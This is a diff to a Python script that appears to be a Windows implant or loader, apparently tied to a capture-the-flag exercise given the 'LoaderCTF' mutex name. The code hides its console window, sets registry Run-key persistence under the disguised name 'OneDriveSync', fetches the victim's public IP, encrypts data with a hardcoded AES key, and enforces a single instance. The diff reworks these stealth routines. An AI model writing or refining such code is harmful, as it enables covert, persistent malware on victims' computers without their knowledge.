@@ -24,14 +24,6 @@ class X:
 Y, Z = True, time.time()
 L = {k:0 for k in X.I.keys()}
 
-def hide_console():
-    kernel32 = ctypes.WinDLL('kernel32')
-    user32 = ctypes.WinDLL('user32')
-    hWnd = kernel32.GetConsoleWindow()
-    if hWnd:
-        user32.ShowWindow(hWnd, 0)
-        kernel32.FreeConsole()
-
 def G():
     try: return urllib.request.urlopen('https://api.ipify.org').read().decode()
     except: return "?"
@@ -57,6 +49,12 @@ def AS(p=None):
         with winreg.OpenKey(k, r, 0, winreg.KEY_WRITE) as x:
             winreg.SetValueEx(x, "OneDriveSync", 0, winreg.REG_SZ, p or os.path.abspath(sys.argv[0]))
     except: pass
+
+def H():
+    k = ctypes.WinDLL('kernel32')
+    u = ctypes.WinDLL('user32')
+    h = k.GetConsoleWindow()
+    if h: u.ShowWindow(h, 0)
 
 def E(d):
     c = AES.new(X.K, AES.MODE_CBC, X.V)
@@ -394,22 +392,11 @@ def main_loop():
         except: time.sleep(60)
 
 def main():
-    hide_console()
-    
-    mutex = win32event.CreateMutex(None, False, "Global\\UniqueAppMutex")
-    if win32api.GetLastError() == win32con.ERROR_ALREADY_EXISTS:
-        sys.exit(0)
-    
     SR()
-    
-    AS()
-
+    H()
+    m = win32event.CreateMutex(None,False,"Global\\LoaderCTF")
+    if win32api.GetLastError()==183: sys.exit(0)
     main_loop()
 
-if __name__ == '__main__':
-    if sys.executable.endswith("pythonw.exe"):
-        main()
-    else:
-        subprocess.Popen([sys.executable.replace("python.exe", "pythonw.exe"), sys.argv[0]], 
-                        creationflags=subprocess.CREATE_NO_WINDOW)
-        sys.exit(0)
+if __name__=='__main__': 
+    main()
